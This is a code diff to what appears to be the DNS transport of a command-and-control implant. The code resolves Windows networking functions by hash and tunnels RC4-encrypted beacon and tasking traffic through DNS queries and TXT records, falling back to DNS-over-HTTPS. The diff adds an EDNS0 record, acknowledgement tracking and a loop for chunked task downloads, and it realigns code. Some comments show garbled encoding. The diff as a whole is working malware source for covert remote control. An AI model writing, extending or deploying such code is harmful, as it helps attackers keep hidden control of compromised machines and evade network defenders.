@@ -60,21 +60,21 @@ ConnectorDNS::ConnectorDNS()
     if (!this->functions)
         return;
 
-    this->functions->LocalAlloc = ApiWin->LocalAlloc;
-    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
-    this->functions->LocalFree = ApiWin->LocalFree;
-    this->functions->WSAStartup = ApiWin->WSAStartup;
-    this->functions->WSACleanup = ApiWin->WSACleanup;
-    this->functions->socket = ApiWin->socket;
-    this->functions->closesocket = ApiWin->closesocket;
-    this->functions->sendto = ApiWin->sendto;
-    this->functions->recvfrom = ApiWin->recvfrom;
-    this->functions->select = ApiWin->select;
+    this->functions->LocalAlloc    = ApiWin->LocalAlloc;
+    this->functions->LocalReAlloc  = ApiWin->LocalReAlloc;
+    this->functions->LocalFree     = ApiWin->LocalFree;
+    this->functions->WSAStartup    = ApiWin->WSAStartup;
+    this->functions->WSACleanup    = ApiWin->WSACleanup;
+    this->functions->socket        = ApiWin->socket;
+    this->functions->closesocket   = ApiWin->closesocket;
+    this->functions->sendto        = ApiWin->sendto;
+    this->functions->recvfrom      = ApiWin->recvfrom;
+    this->functions->select        = ApiWin->select;
     this->functions->gethostbyname = ApiWin->gethostbyname;
-    this->functions->Sleep = ApiWin->Sleep;
-    this->functions->GetTickCount = ApiWin->GetTickCount;
-    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
-    this->functions->GetLastError = ApiWin->GetLastError;
+    this->functions->Sleep         = ApiWin->Sleep;
+    this->functions->GetTickCount  = ApiWin->GetTickCount;
+    this->functions->LoadLibraryA  = ApiWin->LoadLibraryA;
+    this->functions->GetLastError  = ApiWin->GetLastError;
 
     this->dohFunctions = (DOHFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DOHFUNC));
 }
@@ -164,16 +164,16 @@ BOOL ConnectorDNS::InitDoH()
     if (!hWininetModule)
         return FALSE;
 
-    this->dohFunctions->InternetOpenA = (decltype(InternetOpenA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
-    this->dohFunctions->InternetConnectA = (decltype(InternetConnectA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
-    this->dohFunctions->HttpOpenRequestA = (decltype(HttpOpenRequestA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
-    this->dohFunctions->HttpSendRequestA = (decltype(HttpSendRequestA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
-    this->dohFunctions->InternetSetOptionA = (decltype(InternetSetOptionA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
-    this->dohFunctions->InternetQueryOptionA = (decltype(InternetQueryOptionA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
-    this->dohFunctions->HttpQueryInfoA = (decltype(HttpQueryInfoA)*)GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
-    this->dohFunctions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
-    this->dohFunctions->InternetCloseHandle = (decltype(InternetCloseHandle)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
-    this->dohFunctions->InternetReadFile = (decltype(InternetReadFile)*)GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+    this->dohFunctions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
+    this->dohFunctions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+    this->dohFunctions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+    this->dohFunctions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+    this->dohFunctions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+    this->dohFunctions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+    this->dohFunctions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+    this->dohFunctions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
+    this->dohFunctions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+    this->dohFunctions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
 
     if (!this->dohFunctions->InternetOpenA || !this->dohFunctions->HttpSendRequestA)
         return FALSE;
@@ -346,10 +346,12 @@ BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BY
     outBuf[3] = 0x00;
     outBuf[4] = 0x00;
     outBuf[5] = 0x01;  // QDCOUNT = 1
+    outBuf[10] = 0x00;
+    outBuf[11] = 0x01; // ARCOUNT = 1 (EDNS0)
 
     ULONG offset = 12;
 
-    int nameLen = DnsCodec::EncodeName(qname, outBuf + offset, outBufSize - offset - 4);
+    int nameLen = DnsCodec::EncodeName(qname, outBuf + offset, (int)(outBufSize - offset - 16));
     if (nameLen < 0)
         return FALSE;
     offset += nameLen;
@@ -360,6 +362,20 @@ BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BY
     outBuf[offset++] = (BYTE)(qtypeCode & 0xFF);
     outBuf[offset++] = 0x00;
     outBuf[offset++] = 0x01;  // IN class
+
+    if (offset + 11 > outBufSize)
+        return FALSE;
+    outBuf[offset++] = 0x00; // root
+    outBuf[offset++] = 0x00; // TYPE OPT
+    outBuf[offset++] = 41;
+    outBuf[offset++] = 0x10; // CLASS = 4096
+    outBuf[offset++] = 0x00;
+    outBuf[offset++] = 0x00; // TTL
+    outBuf[offset++] = 0x00;
+    outBuf[offset++] = 0x00;
+    outBuf[offset++] = 0x00;
+    outBuf[offset++] = 0x00; // RDLEN
+    outBuf[offset++] = 0x00;
 
     *outLen = offset;
     return TRUE;
@@ -713,24 +729,24 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
     *outSize = 0;
 
     switch (this->dnsMode) {
-    case DNS_MODE_UDP:
-        return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+        case DNS_MODE_UDP:
+            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
-    case DNS_MODE_DOH:
-        return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+        case DNS_MODE_DOH:
+            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
-    case DNS_MODE_UDP_FALLBACK:
-        if (QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
-            return TRUE;
-        return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+        case DNS_MODE_UDP_FALLBACK:
+            if (QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
+                return TRUE;
+            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
-    case DNS_MODE_DOH_FALLBACK:
-        if (QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
-            return TRUE;
-        return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+        case DNS_MODE_DOH_FALLBACK:
+            if (QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
+                return TRUE;
+            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
 
-    default:
-        return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
+        default:
+            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
     }
 }
 
@@ -783,7 +799,7 @@ BOOL ConnectorDNS::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 
     ApiWin->snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
 
-    // Store beat for HI message — decrypt to plaintext so we can compress it
+    // Store beat for HI message â€” decrypt to plaintext so we can compress it
     // (BuildBeat already RC4-encrypted the beat; we need plaintext for zlib compression)
     if (beat && beatSize) {
         this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
@@ -822,7 +838,7 @@ void ConnectorDNS::CloseConnector()
     }
 }
 
-// Simplified framing — SendQuery
+// Simplified framing â€” SendQuery
 
 // SendQuery: encodes data as Base32 DNS labels and sends a single DNS query.
 // Returns TRUE if the query was sent and a response was received.
@@ -889,6 +905,8 @@ void ConnectorDNS::FinalizeDownload()
         return;
 
     this->lastDownTotal = this->downTotal;
+    this->pendingDownAck = this->downTotal;
+    this->pendingDownNonce = this->downTaskNonce;
     this->recvData = this->downBuf;
     this->recvSize = (int)this->downTotal;
     this->downBuf = NULL;
@@ -897,7 +915,7 @@ void ConnectorDNS::FinalizeDownload()
     this->hasPendingTasks = FALSE;
 }
 
-// Exchange — main loop integration
+// Exchange â€” main loop integration
 
 void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
@@ -984,8 +1002,14 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
     // Payload: [ackOffset:4 BE][ackNonce:4 BE] under encryptKey
     {
         BYTE ackBuf[8];
-        WriteBE32(ackBuf, this->downFilled);
-        WriteBE32(ackBuf + 4, this->downTaskNonce);
+        ULONG ackOff = this->downFilled;
+        ULONG ackNonce = this->downTaskNonce;
+        if (ackOff == 0 && this->pendingDownAck > 0) {
+            ackOff = this->pendingDownAck;
+            ackNonce = this->pendingDownNonce;
+        }
+        WriteBE32(ackBuf, ackOff);
+        WriteBE32(ackBuf + 4, ackNonce);
         EncryptRC4(ackBuf, 8, this->encryptKey, 16);
 
         BYTE resp[512];
@@ -995,11 +1019,18 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
                 BYTE flags = resp[0];
                 this->hasPendingTasks = (flags & 0x01) ? TRUE : FALSE;
             }
+            if (this->pendingDownAck > 0 && ackOff == this->pendingDownAck) {
+                this->pendingDownAck = 0;
+                this->pendingDownNonce = 0;
+            }
         }
     }
 
     // 4: Download (TXT: base64(RC4(encryptKey, [total|offset|nonce|data])))
-    if (this->hasPendingTasks) {
+    for (int nget = 0; nget < 64; nget++) {
+        if (!this->hasPendingTasks && !(this->downBuf && this->downTotal > 0 && this->downFilled < this->downTotal))
+            break;
+
         ULONG reqOffset = this->downFilled;
         ULONG nonce = this->functions->GetTickCount() ^ (this->seq << 16);
 
@@ -1010,40 +1041,54 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 
         BYTE resp[4096];
         ULONG respSize = 0;
-        if (SendQueryTXT("api", reqBuf, 8, resp, sizeof(resp), &respSize) && respSize > 0) {
-            // TXT RDATA is base64 of the encrypted frame
-            BYTE binBuf[4096];
-            int binLen = DnsCodec::Base64Decode((const CHAR*)resp, (int)respSize, binBuf, (int)sizeof(binBuf));
-            if (binLen > 12) {
-                DecryptRC4(binBuf, binLen, this->encryptKey, 16);
-
-                ULONG total = ReadBE32(binBuf);
-                ULONG offset = ReadBE32(binBuf + 4);
-                this->downTaskNonce = ReadBE32(binBuf + 8);
-                ULONG dataLen = (ULONG)binLen - 12;
-
-                if (total > 0 && total <= 4194304 && offset + dataLen <= total) {
-                    if (!this->downBuf || this->downTotal != total) {
-                        if (this->downBuf)
-                            MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-                        this->downBuf = (BYTE*)MemAllocLocal(total);
-                        if (!this->downBuf) {
-                            this->downTotal = 0;
-                            return;
-                        }
-                        this->downTotal = total;
-                        this->downFilled = 0;
-                    }
-
-                    memcpy(this->downBuf + offset, binBuf + 12, dataLen);
-                    if (offset + dataLen > this->downFilled)
-                        this->downFilled = offset + dataLen;
-
-                    if (this->downFilled >= this->downTotal)
-                        FinalizeDownload();
-                }
-            }
+        if (!SendQueryTXT("api", reqBuf, 8, resp, sizeof(resp), &respSize) || respSize == 0) {
+            if (!this->downBuf)
+                this->downFilled = 0;
+            break;
         }
+
+        BYTE binBuf[4096];
+        int binLen = DnsCodec::Base64Decode((const CHAR*)resp, (int)respSize, binBuf, (int)sizeof(binBuf));
+        if (binLen <= 12) {
+            if (!this->downBuf)
+                this->downFilled = 0;
+            break;
+        }
+
+        DecryptRC4(binBuf, binLen, this->encryptKey, 16);
+
+        ULONG total = ReadBE32(binBuf);
+        ULONG offset = ReadBE32(binBuf + 4);
+        this->downTaskNonce = ReadBE32(binBuf + 8);
+        ULONG dataLen = (ULONG)binLen - 12;
+
+        if (!(total > 0 && total <= 4194304 && offset + dataLen <= total))
+            break;
+
+        if (!this->downBuf || this->downTotal != total) {
+            if (this->downBuf)
+                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+            this->downBuf = (BYTE*)MemAllocLocal(total);
+            if (!this->downBuf) {
+                this->downTotal = 0;
+                return;
+            }
+            this->downTotal = total;
+            this->downFilled = 0;
+        }
+
+        memcpy(this->downBuf + offset, binBuf + 12, dataLen);
+        if (offset + dataLen > this->downFilled)
+            this->downFilled = offset + dataLen;
+
+        if (this->downFilled >= this->downTotal) {
+            ULONG doneTotal = this->downTotal;
+            FinalizeDownload();
+            this->hasPendingTasks = TRUE;
+            this->downFilled = doneTotal;
+            continue;
+        }
+        this->hasPendingTasks = TRUE;
     }
 
     // Downstream payload from FrameManager is already RC4(sessionKey)-encrypted by PackTasks.
@@ -1056,8 +1101,8 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 void ConnectorDNS::UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct)
 {
     this->profile.burst_enabled = enabled;
-    this->profile.burst_sleep = sleepMs;
-    this->profile.burst_jitter = jitterPct;
+    this->profile.burst_sleep   = sleepMs;
+    this->profile.burst_jitter  = jitterPct;
 }
 
 void ConnectorDNS::GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct)
@@ -1073,13 +1118,13 @@ void ConnectorDNS::GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterP
 BOOL ConnectorDNS::IsBusy() const
 {
     return (this->downBuf != NULL) || this->hasPendingTasks ||
-        (this->downTotal > 0 && this->downFilled < this->downTotal);
+           (this->downTotal > 0 && this->downFilled < this->downTotal);
 }
 
 void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs)
 {
     BOOL isBusy = this->IsBusy();
-    BOOL burst = isBusy || (this->lastUpTotal >= 1024) || (this->lastDownTotal >= 1024) || hasOutput;
+    BOOL burst  = isBusy || (this->lastUpTotal >= 1024) || (this->lastDownTotal >= 1024) || hasOutput;
 
     if (burst && this->profile.burst_enabled) {
         ULONG burstMs = this->profile.burst_sleep;
@@ -1098,19 +1143,16 @@ void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDela
         }
         mySleep(burstMs);
         this->ResetTrafficTotals();
-    }
-    else {
+    } else {
         if (pollIntervalMs > 0) {
             if (wakeupEvent) {
                 DWORD r = ApiWin->WaitForSingleObject(wakeupEvent, pollIntervalMs);
                 if (r == WAIT_OBJECT_0)
                     ApiWin->ResetEvent(wakeupEvent);
-            }
-            else {
+            } else {
                 ApiWin->Sleep(pollIntervalMs);
             }
-        }
-        else {
+        } else {
             WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
         }
         if (burst)
